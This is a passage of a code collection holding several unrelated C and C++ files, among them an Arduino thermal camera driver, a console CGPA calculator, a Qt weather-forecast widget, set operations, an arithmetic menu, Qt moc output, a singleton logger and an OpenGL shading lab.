roundUpPtr16(spiFrame) + 16 - 4 : NULL; }\n#else\nstatic inline int roundUpVal16(int val) { return val; }\nstatic inline byte *roundUpPtr16(byte *ptr) { return ptr; }\nstatic inline byte *roundUpMalloc16(int size) { return (byte *)malloc((size_t)size); }\nstatic inline byte *roundUpSpiFrame16(byte *spiFrame) { return spiFrame; }\n#endif\n\n#ifndef digitalWriteFast\nstatic void csEnableFuncDef(byte pin) { digitalWrite(pin, LOW); }\nstatic void csDisableFuncDef(byte pin) { digitalWrite(pin, HIGH); }\n#else\nstatic void csEnableFuncDef(byte pin) { digitalWriteFast(pin, LOW); }\nstatic void csDisableFuncDef(byte pin) { digitalWriteFast(pin, HIGH); }\n#endif\n\n#ifndef LEPFLIR_USE_SOFTWARE_I2C\nLeptonFLiR::LeptonFLiR(TwoWire& i2cWire, byte spiCSPin) {\n    _i2cWire = &i2cWire;\n#else\nLeptonFLiR::LeptonFLiR(byte spiCSPin) {\n#endif\n    _spiCSPin = spiCSPin;\n    _spiSettings = SPISettings(LEPFLIR_SPI_MAX_SPEED, MSBFIRST, SPI_MODE3);\n    _storageMode = LeptonFLiR_ImageStorageMode_Count;\n    _csEnableFunc = csEnableFuncDef;\n    _csDisableFunc = csDisableFuncDef;\n    _imageData = _spiFrameData = _telemetryData = NULL;\n    _isReadingNextFrame = false;\n    _lastI2CError = _lastLepResult = 0;\n}\n\nLeptonFLiR::~LeptonFLiR() {\n    if (_imageData) free(_imageData);\n    if (_spiFrameData) free(_spiFrameData);\n    if (_telemetryData) free(_telemetryData);\n}\n\nvoid LeptonFLiR::init(LeptonFLiR_ImageStorageMode storageMode, LeptonFLiR_TemperatureMode tempMode) {\n    _storageMode = (LeptonFLiR_ImageStorageMode)constrain((int)storageMode, 0, (int)LeptonFLiR_ImageStorageMode_Count - 1);\n    _tempMode = (LeptonFLiR_TemperatureMode)constrain((int)tempMode, 0, (int)LeptonFLiR_TemperatureMode_Count - 1);\n\n#ifdef LEPFLIR_ENABLE_DEBUG_OUTPUT\n    Serial.print(\"LeptonFLiR::init spiCSPin: \");\n    Serial.print(_spiCSPin);\n    Serial.print(\", storageMode: \");\n    Serial.print(_storageMode);\n    Serial.print(\", tempMode: \");\n    Serial.println(_tempMode);\n#endif\n\n    pinMode(_spiCSPin, OUTPUT);\n    _csDisableFunc(_spiCSPin);\n\n    _imageData = roundUpMalloc16(getImageTotalBytes());\n#ifdef LEPFLIR_ENABLE_DEBUG_OUTPUT\n    if (!_imageData)\n        Serial.println(\"  LeptonFLiR::init Failure allocating imageData.\");\n#endif\n\n    _spiFrameData = roundUpMalloc16(getSPIFrameTotalBytes());\n#ifdef LEPFLIR_ENABLE_DEBUG_OUTPUT\n    if (!_spiFrameData)\n        Serial.println(\"  LeptonFLiR::init Failure allocating spiFrameData.\");\n#endif\n\n#ifdef LEPFLIR_ENABLE_DEBUG_OUTPUT\n    int mallocOffset = 0;\n#ifndef LEPFLIR_DISABLE_ALIGNED_MALLOC\n    mallocOffset = 15;\n#endif\n    Serial.print(\"  LeptonFLiR::init imageData: \");\n    Serial.print(_imageData ? getImageTotalBytes() + mallocOffset : 0);\n    Serial.print(\"B, spiFrameData: \");\n    Serial.print(_sp",
    "/**\n * @file main.cpp\n * @author Sumit Kumar (ravirajkarn@outlook.com)\n * @brief This is simple console CGPA calculator.\n * @version 0.1\n * @date 2024-07-02\n * \n * @copyright Copyright (c) 2024\n * \n */\n\n#include <fmt/core.h>\n#include <fmt/color.h>\n#include <cmath>\n#include \"classs.h\"\n#include <vector>\n\nint main()\n{\n    int size = 94; // length of header and boundary \n    Child Student; // basic/personal information about student.\n    size_t maximum = 12; // maximum length of subject entered. \n    float total_points = 0;  // total points to calculate CGPA.\n    std::vector<Subject> subjects; // data of each subject.\n    int no_of_subject; // how may subject user will enter.\n\n\n    //* Input module\n    header(size);\n    give_pdetail(Student); // take users personal detail\n    fmt::print(\"How many subject are there? \");\n    std::cin >> no_of_subject;\n\n    for (int i = 0; i < no_of_subject; i++)\n    {\n        std::string subj_name;\n        int full_marks, marks_obtain;\n\n        take_subj_info(subj_name, full_marks, marks_obtain); // gathering information about each subject.\n        subjects.push_back(Subject(subj_name, full_marks, marks_obtain)); // storing information of each subject.\n        maximum = (((subj_name.size()) > (maximum)) ? (subj_name.size()) : (maximum)); // storing the maximum length of subject.\n    }\n    \n\n    //* Output module\n    clear();\n    header(size);\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{0: <{1}}\\n\", \" \",size);\n    fmt::print(fmt::bg(fmt::color::light_coral) | fmt::emphasis::bold, \"{0: ^{1}}\\n\", \"REPORT CARD\", size);\n    fmt::print(fmt::bg(fmt::color::light_coral) | fmt::fg(fmt::color::white) | fmt::emphasis::underline, \"{: <{}}\\n\", \" \", size);\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{1:>10}Name: {0:<{2}}\\n\", Student.name, \" \", size - 16);\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{0:>10}Class: {1:<}{0:>{2}}rollno: {3}{0:>10}\\n\",\"\" , Student.classs, (size - 2 * 10 - 15 - Student.classs.size() - Student.rollno.size())  ,Student.rollno);\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{1:>10}School: {0:<{2}}\\n\", Student.school, \" \", size - 18);\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{2:>{3}}Weight: {0}{2:>{4}}Present: {1}{2:>{3}}\\n\", Student.weight, Student.present, \" \", 10, (size - 2 * 10 - 17 - Student.weight.size() - std::to_string(Student.present).size()));\n    fmt::print(fmt::bg(fmt::color::light_coral) | fmt::fg(fmt::color::white_smoke) | fmt::emphasis::underline, \"{0:>{1}}\\n\", \".\", size);\n\n    int x = (size -19 -47 -maximum);\n    fmt::print(fmt::bg(fmt::color::light_coral) | fmt::emphasis::underline, \"| {0:>6} | {1:^{2}} | {3:^12} | {4:^14} | {5:^8} | {6:^7} |\\n\", \"\", \"Subject\", maximum + x, \"Full Marks\", \"Marks Obtain\", \"Points\", \"Grade\");\n    int i(0);\n    for (const auto& subject : subjects)\n    {\n        i++;\n        fmt::print(fmt::bg(fmt::color::light_coral) | fmt::emphasis::underline, \"| {0:>5}) | {1:<{2}} | {3:^12} | {4:^14} | {5:^8.2} | {6:^7} |\\n\", i+1, subject.name() , maximum + x, subject.full_mark(), subject.score(), subject.point(), ptog(subject.point()));\n        total_points =  total_points + subject.point();\n    }\n    \n    \n    fmt::print(fmt::bg(fmt::color::light_coral), \"{0: <{1}}\\n\", \" \",size);\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{0: >{1}}{2: <{1}}\\n\", \"CGPA: \",size/2,(static_cast<float>(total_points/no_of_subject)));\n    fmt::print(fmt::bg(fmt::color::light_coral), \"{0: <{1}}\\n\", \" \",size);\n    return 0;\n}",
    "#include \"forecast.h\"\n#include \"api.h\"\n#include <QHBoxLayout>\n#include <QLabel>\n#include <QPixmap>\n\nforecast::forecast(QWidget *parent)\n    : QWidget(parent)\n{\n    QVBoxLayout *mainLayout = new QVBoxLayout(this);\n\n\n\n    // \u521b\u5efa\u5de6\u4e0a\u89d2\u7684\u6587\u672c\u6807\u7b7e\n    QLabel *title = new QLabel(\"\u57fa\u4e8e\u673a\u5668\u5b66\u4e60\u7684\u6c14\u6e29\u8d8b\u52bf\u9884\u6d4b\", this);\n    title->setAlignment(Qt::AlignLeft | Qt::AlignTop);\n    title->setStyleSheet(\"font-size: 18px; font-weight: bold; color: #1F2937; margin-top: 10px; margin-left: 10px;\");\n    mainLayout->addWidget(title);\n\n    // \u521b\u5efa\u6c34\u5e73\u5e03\u5c40\uff0c\u7528\u4e8e\u653e\u7f6e\u4e24\u4e2a\u6309\u94ae\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\n\n    // \u521b\u5efa\u9009\u62e9\u57ce\u5e02\u4e0b\u62c9\u6846\n    cityBox = new QComboBox(this);\n    cityBox->addItem(\"\u6b66\u6c49\");\n    cityBox->addItem(\"\u5317\u4eac\");\n    cityBox->addItem(\"\u4e0a\u6d77\");\n    cityBox->addItem(\"\u957f\u6c99\");\n    cityBox->addItem(\"\u5357\u4eac\");\n    cityBox->addItem(\"\u676d\u5dde\");\n    buttonLayout->addWidget(cityBox);\n\n    // \u521b\u5efa\u9884\u6d4b\u6309\u94ae\n    btnPredict = new QPushButton(\"\u9884\u6d4b\", this);\n    buttonLayout->addWidget(btnPredict);\n\n    mainLayout->addLayout(buttonLayout);\n\n    // \u521b\u5efa\u7528\u4e8e\u663e\u793a\u7b97\u6cd5\u751f\u6210\u56fe\u50cf\u7684\u5360\u4f4d\u7b26\u6807\u7b7e\n    imagePlaceholder = new QLabel(this);\n    imagePlaceholder->setFixedSize(800, 600);\n    imagePlaceholder->setAlignment(Qt::AlignCenter);\n    imagePlaceholder->setStyleSheet(\"border: 1px solid #E5E7EB; background-color: #F3F4F6; color: #4B5563; font-size: 16px;\");\n    imagePlaceholder->setText(\"\u56fe\u50cf\u533a\u57df\");\n\n    mainLayout->addWidget(imagePlaceholder, 0, Qt::AlignHCenter | Qt::AlignVCenter);\n\n    setLayout(mainLayout);\n\n    setStyleSheet(R\"(\n        QWidget {\n            background-color: #F9FAFB;\n            color: #1F2937;\n            font-family: \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial, sans-serif;\n        }\n        QComboBox {\n            background-color: #FFFFFF;\n            border: 1px solid #E1E8ED;\n            border-radius: 5px;\n            padding: 5px;\n            font-family: \"Arial\", sans-serif;\n            font-size: 14px;\n            color: #333333;\n        }\n        QComboBox::drop-down {\n            subcontrol-origin: padding;\n            subcontrol-position: top right;\n            width: 15px;\n            border-left-width: 1px;\n            border-left-color: #E1E8ED;\n            border-left-style: solid;\n            border-top-right-radius: 3px;\n            border-bottom-right-radius: 3px;\n        }\n        QComboBox::down-arrow {\n            image: url(:/icons/down_arrow.png); /* Ensure you have a suitable icon */\n            width: 10px;\n            height: 10px;\n        }\n        QComboBox QAbstractItemView {\n            background-color: #FFFFFF;\n            border: 1px solid #E1E8ED;\n            selection-background-color: #E6EDF5;\n            selection-color: #333333;\n        }\n        QPushButton {\n            background-color: #f7fbfc;\n            color: #769fcd;\n            border: 1px solid #8B8989;\n            border-radius: 5px;\n            padding: 10px 20px;\n            font-family: \"Arial\", sans-serif;\n            font-size: 14px;\n            font-weight: bold;\n        }\n        QPushButton:hover {\n            background-color: #d6e6f2;\n            border: 1px solid #d6e6f2;\n        }\n        QPushButton:pressed {\n            background-color: #b9d7ea;\n            border: 1px solid #b9d7ea;\n        }\n        QLabel {\n            background-color: #F3F4F6;\n            color: #4B5563;\n            font-size: 16px;\n        }\n    )\");\n    connect(btnPredict, &QPushButton::clicked, this, &forecast::onPredictClicked);\n}\n\nforecast::~forecast()\n{\n}\n\nvoid forecast::onSelectCityClicked()\n{\n    // \u9009\u62e9\u5bf9\u5e94\u57ce\u5e02\n}\n\nvoid forecast::onPredictClicked()\n{\n    api *forecast_api = new api;\n    double data;\n\n    connect(forecast_api, &api::predictionReady, this, &forecast::onPredictionReady);\n\n    forecast_api->machine_learning(cityBox->currentText(), data);\n}\n\nvoid forecast::onPredictionReady(double data)\n{\n    qDebug() << \"\u9884\u6d4b\u7ed3\u679c:\" << data;\n    // \u5728\u8fd9\u91cc\u5b9e\u73b0\u70b9\u51fb\u67e5\u8be2\u4e4b\u540e\u7684\u9884\u6d4b\u7b97\u6cd5\n    // Example: labelImage->setPixmap(QPixmap(\":/images/image.png\"));\n}\n",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nclass SET {\r\nprivate:\r\n    vector<vector<int>> sets;\r\n\r\npublic:\r\n    int Insert(int setNum, int setdata) {\r\n        if (setNum >= sets.size()) {\r\n            sets.resize(setNum + 1, {});\r\n        }\r\n        vector<int>& initialset = sets[setNum];\r\n        for (int i = 0; i < initialset.size(); i++) {\r\n            if (initialset[i] == setdata) {\r\n                return initialset.size();\r\n            } else if (initialset[i] > setdata) {\r\n                initialset.insert(initialset.begin() + i, setdata);\r\n                return initialset.size();\r\n            }\r\n        }\r\n        initialset.push_back(setdata);\r\n        return initialset.size();\r\n    }\r\n\r\n    int Size(int setNum);\r\n\r\n    int Delete(int setNum, int setdata) {\r\n        if (setNum >= 0 && setNum < sets.size()) {\r\n            vector<int>& initialset = sets[setNum];\r\n            for (int i = 0; i < initialset.size(); i++) {\r\n                if (initialset[i] == setdata) {\r\n                    initialset.erase(initialset.begin() + i);\r\n                    return initialset.size();\r\n                }\r\n            }\r\n            return initialset.size();\r\n        }\r\n        return -1;\r\n    }\r\n\r\n    int Belongsto(int setNum, int setdata) {\r\n        if (setNum >= 0 && setNum < sets.size()) {\r\n            vector<int>& initialset = sets[setNum];\r\n            for (int i = 0; i < initialset.size(); i++) {\r\n                if (initialset[i] == setdata) {\r\n                    return 1;\r\n                }\r\n            }\r\n            return 0;\r\n        }\r\n        return -1;\r\n    }\r\n\r\n    int Union(int setnum1, int setnum2) {\r\n        if (setnum1 >= sets.size()) {\r\n            sets.resize(setnum1 + 1, {});\r\n        }\r\n        if (setnum2 >= sets.size()) {\r\n            sets.resize(setnum2 + 1, {});\r\n        }\r\n        vector<int>& set1 = sets[setnum1];\r\n        vector<int>& set2 = sets[setnum2];\r\n        int i = 0;\r\n        int j = 0;\r\n        vector<int> unionele;\r\n        while (i < set1.size() && j < set2.size()) {\r\n            if (set1[i] < set2[j]) {\r\n                unionele.push_back(set1[i]);\r\n                i++;\r\n            } else if (set1[i] > set2[j]) {\r\n                unionele.push_back(set2[j]);\r\n                j++;\r\n            } else {\r\n                unionele.push_back(set1[i]);\r\n                i++;\r\n                j++;\r\n            }\r\n        }\r\n        while (i < set1.size()) {\r\n            unionele.push_back(set1[i]);\r\n            i++;\r\n        }\r\n        while (j < set2.size()) {\r\n            unionele.push_back(set2[j]);\r\n            j++;\r\n        }\r\n        sets[setnum1] = unionele;\r\n        return sets[setnum1].size();\r\n    }\r\n\r\n    int Intersection(int setnum1, int setnum2);\r\n\r\n    int Difference(int setnum1, int setnum2) {\r\n        if (setnum1 >= sets.size() || setnum2 >= sets.size()) {\r\n            sets.resize(max(setnum1, setnum2) + 1, {});\r\n        }\r\n        vector<int>& set1 = sets[setnum1];\r\n        vector<int>& set2 = sets[setnum2];\r\n        vector<int> indicesToDelete;\r\n\r\n        int i = 0, j = 0;\r\n        while (i < set1.size() && j < set2.size()) {\r\n            if (set1[i] < set2[j]) {\r\n                i++;\r\n            } else if (set1[i] > set2[j]) {\r\n                j++;\r\n            } else {\r\n                set1.erase(set1.begin() + i);\r\n            }\r\n        }\r\n\r\n        return set1.size();\r\n    }\r\n\r\n    int SymmetricDifference(int setnum1, int setnum2) {\r\n        if (setnum1 >= sets.size() || setnum2 >= sets.size()) {\r\n            sets.resize(max(setnum1, setnum2) + 1, {});\r\n        }\r\n        vector<int>& set1 = sets[setnum1];\r\n        vector<int>& set2 = sets[setnum2];\r\n        vector<int> symetricdiff;\r\n        int i = 0, j = 0;\r\n        while (i < set1.size() && j < set2.size()) {\r\n            if (set1[i] < set2[j]) {\r\n                symetricdiff.push_back(set1[i]);\r\n                i++;\r\n            } else if (set1[i] > set2[j]) {\r\n                symetricdiff.push_back(set2[j]);\r\n                j++;\r\n            } else {\r\n                i++;\r\n                j++;\r\n            }\r\n        }\r\n        while (i < set1.size()) {\r\n            symetricdiff.push_back(set1[i]);\r\n            i++;\r\n        }\r\n        while (j < set2.size()) {\r\n            symetricdiff.push_back(set2[j]);\r\n            j++;\r\n        }\r\n        sets[setnum1] = symetricdiff;\r\n        return symetricdiff.size();\r\n    }\r\n\r\n    void Print(int setnum) {\r\n        if (setnum >= sets.size() || sets[setnum].size() == 0) {\r\n            cout << endl;\r\n            return;\r\n        }\r\n        vector<int>& initialset = sets[setnum];\r\n        for (int i = 0; i < initialset.size() - 1; i++) {\r\n            cout << initialset[i] << \",\";\r\n        }\r\n        cout << initialset[initialset.size() - 1] << endl;\r\n    }\r\n};\r\n\r\nint SET::Size(int setNum) {\r\n    if (setNum >= sets.size()) {\r\n        sets.resize(setNum + 1, {});\r\n        return 0;\r\n    }\r\n    return sets[setNum].size();\r\n}\r\n\r\nint SET:",
    "#include <stdio.h>\r\n\r\n/*void addition();\r\nvoid subtraction();\r\nvoid multiplication();\r\nvoid division();\r\nvoid modulus();\r\n*/\r\n\r\nvoid addition() \r\n{\r\n    int num1, num2, result;\r\n    printf(\"Enter first numbers : \");\r\n    scanf(\"%d\", &num1);\r\n    printf(\"Enter second numbers : \");\r\n    scanf(\"%d\", &num2);\r\n    \r\n    \r\n    result = num1 + num2;\r\n    printf(\"Result: %d\\n\", result);\r\n}\r\n\r\nvoid subtraction() \r\n{\r\n   int num1, num2, result;\r\n    printf(\"Enter first numbers : \");\r\n    scanf(\"%d\", &num1);\r\n    printf(\"Enter second numbers : \");\r\n    scanf(\"%d\", &num2);\r\n    \r\n    result = num1 - num2;\r\n    printf(\"Result: %d\\n\", result);\r\n}\r\n\r\nvoid multiplication() \r\n{\r\n    int num1, num2, result;\r\n    printf(\"Enter first numbers : \");\r\n    scanf(\"%d\", &num1);\r\n    printf(\"Enter second numbers : \");\r\n    scanf(\"%d\", &num2);\r\n    \r\n    result = num1 * num2;\r\n    printf(\"Result: %d\\n\", result);\r\n}\r\n\r\nvoid division() \r\n{\r\n    int num1, num2, result;\r\n    printf(\"Enter first numbers : \");\r\n    scanf(\"%d\", &num1);\r\n    printf(\"Enter second numbers : \");\r\n    scanf(\"%d\", &num2);\r\n    \r\n    if (num2 == 0) \r\n\t{\r\n        printf(\"Error! Division by zero is not allowed.\\n\");\r\n    } \r\n\telse \r\n\t{\r\n        result = num1 / num2;\r\n        printf(\"Result: %d\\n\", result);\r\n    }\r\n}\r\n\r\nvoid modulus() \r\n{\r\n   int num1, num2, result;\r\n    printf(\"Enter first numbers : \");\r\n    scanf(\"%d\", &num1);\r\n    printf(\"Enter second numbers : \");\r\n    scanf(\"%d\", &num2);\r\n    \r\n    if (num2 == 0) \r\n\t{\r\n        printf(\"Error! Modulus by zero is not allowed.\\n\");\r\n    } \r\n\telse \r\n\t{\r\n        result = num1 % num2;\r\n        printf(\"Result: %d\\n\", result);\r\n    }\r\n}\r\n\r\n\r\n\r\nint main()\r\n{\r\n    char choice;\r\n\r\n    do \r\n\t{\r\n        \r\n        printf(\"\\n=== Arithmetic Operations Menu ===\\n\");\r\n        printf(\"1. Addition\\n\");\r\n        printf(\"2. Subtraction\\n\");\r\n        printf(\"3. Multiplication\\n\");\r\n        printf(\"4. Division\\n\");\r\n        printf(\"5. Modulus\\n\");\r\n        printf(\"6. Quit the program\\n\");\r\n        printf(\"=================================\\n\");\r\n        printf(\"Enter your choice: \");\r\n        scanf(\" %c\", &choice);\r\n        \r\n        switch(choice) \r\n\t\t{\r\n            case '1':\r\n                addition();\r\n                break;\r\n            case '2':\r\n                subtraction();\r\n                break;\r\n            case '3':\r\n                multiplication();\r\n                break;\r\n            case '4':\r\n                division();\r\n                break;\r\n            case '5':\r\n                modulus();\r\n                break;\r\n            case '6':\r\n                printf(\"Exiting the program... Thank you \\n\");\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice! Please enter a valid option.\\n\");\r\n        }\r\n    } while(choice != '6'); \r\n\r\n    return 0;\r\n}\r\n\r\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'screenrect.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.2.4)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../screenrect.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'screenrect.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.2.4. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_ScreenRect_t {\n    const uint offsetsAndSize[8];\n    char stringdata0[28];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(offsetof(qt_meta_stringdata_ScreenRect_t, stringdata0) + ofs), len \nstatic const qt_meta_stringdata_ScreenRect_t qt_meta_stringdata_ScreenRect = {\n    {\nQT_MOC_LITERAL(0, 10), // \"ScreenRect\"\nQT_MOC_LITERAL(11, 10), // \"selectRect\"\nQT_MOC_LITERAL(22, 0), // \"\"\nQT_MOC_LITERAL(23, 4) // \"rect\"\n\n    },\n    \"ScreenRect\\0selectRect\\0\\0rect\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_ScreenRect[] = {\n\n // content:\n      10,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       1,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       1,       // signalCount\n\n // signals: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    1,   20,    2, 0x06,    1 /* Public */,\n\n // signals: parameters\n    QMetaType::Void, QMetaType::QRect,    3,\n\n       0        // eod\n};\n\nvoid ScreenRect::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<ScreenRect *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->selectRect((*reinterpret_cast< std::add_pointer_t<QRect>>(_a[1]))); break;\n        default: ;\n        }\n    } else if (_c == QMetaObject::IndexOfMethod) {\n        int *result = reinterpret_cast<int *>(_a[0]);\n        {\n            using _t = void (ScreenRect::*)(QRect );\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&ScreenRect::selectRect)) {\n                *result = 0;\n                return;\n            }\n        }\n    }\n}\n\nconst QMetaObject ScreenRect::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_ScreenRect.offsetsAndSize,\n    qt_meta_data_ScreenRect,\n    qt_static_metacall,\n    nullptr,\nqt_incomplete_metaTypeArray<qt_meta_stringdata_ScreenRect_t\n, QtPrivate::TypeAndForceComplete<ScreenRect, std::true_type>, QtPrivate::TypeAndForceComplete<void, std::false_type>, QtPrivate::TypeAndForceComplete<QRect, std::false_type>\n\n\n\n>,\n    nullptr\n} };\n\n\nconst QMetaObject *ScreenRect::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *ScreenRect::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_ScreenRect.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint ScreenRect::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 1)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 1;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 1)\n            *reinterpret_cast<QMetaType *>(_a[0]) = QMetaType();\n        _id -= 1;\n    }\n    return _id;\n}\n\n// SIGNAL 0\nvoid ScreenRect::selectRect(QRect _t1)\n{\n    void *_a[] = { nullptr, const_cast<void*>(reinterpret_cast<const void*>(std::addressof(_t1))) };\n    QMetaObject::activate(this, &staticMetaObject, 0, _a);\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "#if (1) // logger test\n#include <iostream>\n#include <string>\n#include <fstream>\nusing namespace std;\n\nclass Logger {\npublic:\n\tstatic Logger& getInstance() {\n\t\tstatic Logger instance;\n\t\treturn instance;\n\t}\n\n\t~Logger() {\n\t\tfile1.close();\n\t}\n\n\tvoid write(string str) {\n\t\tfile1 << \"ERROR :: \" << str << \"\\n\";\n\t}\n\nprivate:\n\tofstream file1;\n\n\tLogger() {\n\t\tfile1.open(\"input.txt\");\n\t}\n};\n\nint main() {\n\tLogger& logger = Logger::getInstance();\n\tlogger.write(\"abcd\");\n\n\tLogger& logger2 = Logger::getInstance();\n\tlogger2.write(\"efgh\");\n}\n#endif\n\n\n\n#if (0) // singleton \u00b1\u00e2\u00ba\u00bb\ninclude <iostream>\nusing namespace std;\n\nclass Singleton\n{\npublic:\n\tstatic Singleton& getInstance()\n\t{\n\t\tstatic Singleton instance;\n\t\treturn instance;\n\t}\n\n\tvoid setValue(int n)\n\t{\n\t\tval = n;\n\t}\n\n\tvoid showValue()\n\t{\n\t\tcout << val << endl;\n\t}\n\nprivate:\n\tSingleton() {}\n\tint val = 0;\n\n\tSingleton& operator=(const Singleton& other) = delete;\n\tSingleton(const Singleton& other) = delete;\n};\n\nint main()\n{\n\tSingleton& temp1 = Singleton::getInstance();\n\tSingleton& temp2 = Singleton::getInstance();\n\n\ttemp1.setValue(7);\n\ttemp1.showValue();\n\ttemp2.showValue();\n}\n#endif",
    "/*\n * basicShading\n *\n * Adapted from http://opengl-tutorial.org\n * by Stefanie Zollmann\n *\n * Model loading with assimp library and shading using phong reflection and phong shading\n *\n */\n\n\n// Include standard headers\n#include <stdio.h>\n#include <iostream>\n#include <stdlib.h>\n#include <string>\n#include <vector>\n\n#include <glad/gl.h>\n\n#define GLAD_GL_IMPLEMENTATION \n\n\n// Include GLFW\n\n#include <GLFW/glfw3.h>\nGLFWwindow* window;\n\n\n// Include GLM\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\nusing namespace glm;\n\n#include <common/Shader.hpp>\n#include <common/Texture.hpp>\n#include <common/Object.hpp>\n#include <common/Scene.hpp>\n#include <common/Triangle.hpp>\n#include <common/BasicMaterialShader.hpp>\n#include <common/Mesh.hpp>\n#include <common/Controls.hpp>\n\n#include <common/SimpleObjloader.hpp>\n\n\n/* ---- Helper Functions  ------------------------------------------------------- */\n\n/*\n *  initWindow\n *\n *  This is used to set up a simple window using GLFW.\n *  Returns true if sucessful otherwise false.\n */\nbool initWindow(std::string windowName){\n\t\n\t// Initialise GLFW\n\tif( !glfwInit() ){\n\t\tfprintf( stderr, \"Failed to initialize GLFW\\n\" );\n\t\tgetchar();\n\t\treturn false;\n\t}\n\t\n\tglfwWindowHint(GLFW_SAMPLES, 4);\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n\tglfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE); // To make MacOS happy; should not be needed\n\tglfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\t\n\t\t// Open a window and create its OpenGL context\n\twindow = glfwCreateWindow( 1024, 768, windowName.c_str(), NULL, NULL);\n\tif( window == NULL ){\n\t\tfprintf( stderr, \"Failed to open GLFW window. If you have an Intel GPU, they are not 3.3 compatible.\\n\" );\n\t\tgetchar();\n\t\tglfwTerminate();\n\t\treturn false;\n\t}\n\tglfwMakeContextCurrent(window);\n\t\n\treturn true;\n\t\n}\n\n\n\nint main( void )\n{\n\t\n\tinitWindow(\"LAB - Part 05\");\n\tglfwMakeContextCurrent(window);\n\t\n\t// Initialize glad\n\tint version = gladLoadGL(glfwGetProcAddress);\n\tif (version == 0) {\n\t\tprintf(\"Failed to initialize OpenGL context\\n\");\n\t\treturn -1;\n\t}\n\n\t\n\t\t// Ensure we can capture the escape key being pressed below\n\tglfwSetInputMode(window, GLFW_STICKY_KEYS, GL_TRUE);\n\t\t// Ensure we can capture the escape key being pressed below\n\tglfwSetInputMode(window, GLFW_STICKY_KEYS, GL_TRUE);\n\t\t// Hide the mouse and enable unlimited mouvement\n\tglfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\t\n\t\t// Set the mouse at the center of the screen\n\tglfwPollEvents();\n\tglfwSetCursorPos(window, 1024/2, 768/2);\n\t\n\t// Dark blue background\n\tglClearColor(0.0f, 0.0f, 0.4f, 0.0f);\n\t// Enable depth test\n\tglEnable(GL_DEPTH_TEST);\n\t// Accept fragment if it closer to the camera than the former one\n\tglDepthFunc(GL_LESS);\n\t\n\t// Cull triangles which normal is not towards the camera\n\tglEnable(GL_CULL_FACE);\n\t\n\n\t//create a Vertex Array Object and set it as the current one\n\t//we will not go into detail here. but this can be used to optimise the performance by storing all of the state needed to supply vertex data\n\tGLuint VertexArrayID;\n\tglGenVertexArrays(1, &VertexArrayID);\n\tglBindVertexArray(VertexArrayID);\n\t\n\t/*\n\t * Create Scene\n\t * With a object and texture loaded from loader\n\t */\n\t\n\t// Read our .obj file\n\tstd::vector<unsigned short> indices;\n\tstd::vector<glm::vec3> indexed_vertices;\n\tstd::vector<glm::vec2> indexed_uvs;\n\tstd::vector<glm::vec3> indexed_normals;\n\tbool res = loadAssImp(\"suzanne.obj\", indices, indexed_vertices, indexed_uvs, indexed_normals, true);\n\tif(res){\n\t\t//create scene\n\t\tScene* myScene = new Scene();\n\t\t //create mesh\n\t\tMesh* myGeom = new Mesh();\n\t\tmyGeom->setVertices(indexed_vertices);\n\t\tmyGeom->setUVs(indexed_uvs);\n\t\tmyGeom->setNormals(indexed_normals);\n\t\tmyGeom->setIndices(indices);\n\t\tBasicMaterialShader* shader = new BasicMaterialShader( \"basicMaterialShader\");\n\t\tshader->setLightColor(vec3(1.0, 1.0, 1.0));\n\t\t//add some default texture\n\t\tTexture* texture = new 